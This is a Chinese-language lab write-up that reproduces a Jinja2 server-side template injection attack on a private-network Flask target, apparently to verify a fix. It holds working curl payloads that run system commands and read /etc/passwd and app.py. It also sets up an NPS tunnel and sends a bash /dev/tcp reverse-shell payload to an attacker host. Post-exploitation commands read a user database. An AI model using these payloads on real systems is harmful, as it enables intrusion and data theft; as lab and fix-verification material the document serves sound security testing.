# SSTI + NPS 内网穿透反弹Shell 完整攻击复现流程

---

## 一、修复前攻防场景

### Step 1: SSTI 基础探测
```bash
curl "http://192.168.126.133:5000/welcome?name={{7*7}}"
# 修复前 → 返回 "49"（确认SSTI存在）
# 修复后 → 返回 "{{7*7}}"（纯文本，无法执行）
```

### Step 2: 魔术方法执行系统命令
```bash
# 读取项目源码
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat app.py").read() }}'

# 读取系统用户
curl -G "http://192.168.126.133:5000/welcome" \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("cat /etc/passwd").read() }}'

# 执行id命令
curl -X POST \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("id").read() }}' \
  --data-urlencode 'message=test' \
  "http://192.168.126.133:5000/feedback"
```

### Step 3: NPS 内网穿透搭建 TCP 隧道
```bash
# 攻击者 VPS 启动 NPS server（公网服务器）
# 下载 nps: https://github.com/ehang-io/nps/releases
./nps server

# 靶机启动 NPC client
./npc -server=YOUR_PUBLIC_IP:8024 -vkey=your_vkey
# → 建立 TCP 隧道: 公网:4444 → 内网靶机:4444
```

### Step 4: 本地 nc 监听反弹 Shell
```bash
# 攻击者机器启动 nc 监听（公网端口）
nc -lvnp 4444

# 或通过 NPS 映射后在本机监听
nc -lvnp 4444
```

### Step 5: 提交 SSTI 反弹 Shell 载荷
```bash
# 通过 /feedback POST 提交反弹 Shell
curl -X POST \
  --data-urlencode 'name={{ config.__class__.__init__.__globals__["os"].popen("bash -c '\''bash -i >& /dev/tcp/192.168.126.1/4444 0>&1'\''").read() }}' \
  --data-urlencode 'message=x' \
  "http://192.168.126.133:5000/feedback"

# 修复前: nc 收到交互式 Shell，可执行任意命令
# 修复后: WAF拦截或纯文本显示，无法反弹
```

### Step 6: 内网横向渗透
```bash
# 反弹 Shell 成功后，在靶机执行：
whoami
cat /etc/passwd
cat /opt/Class01/app.py
cat /opt/Class01/data/users.db
ip addr  # 探测内网网段
```

---

## 二、修复前后对比

| 测试项 | 修复前 | 修复后 |
|--------|--------|--------|
| `{{7*7}}` 探测 | 返回 "49" | 返回 "{{7*7}}" |
| `{{config}}` 读取 | 返回Config对象 | 纯文本显示 |
| `__class__` 关键字 | 可执行MRO链 | WAF拦截 |
| `__mro__` 关键字 | 可遍历子类 | WAF拦截 |
| 魔术读app.py | 返回源码 | WAF拦截 |
| 魔术读/etc/passwd | 返回密码文件 | WAF拦截 |
| 反弹Shell | 获取交互式Shell | WAF拦截 |
| `<script>` XSS | 浏览器执行脚本 | 实体转义无害 |

---

## 三、修复合格判定

- ✅ TC-S01：正常中文名显示 → 功能正常
- ✅ TC-S02~TC-S11：所有SSTI载荷被拦截/纯文本化
- ✅ TC-S12：正常反馈可用
- ✅ TC-S13~TC-S17：所有SSTI/XSS载荷被拦截/转义
- ✅ 全部17项PASS → SSTI漏洞修复通过
- ❌ 任一Payload可执行 → 修复未通过
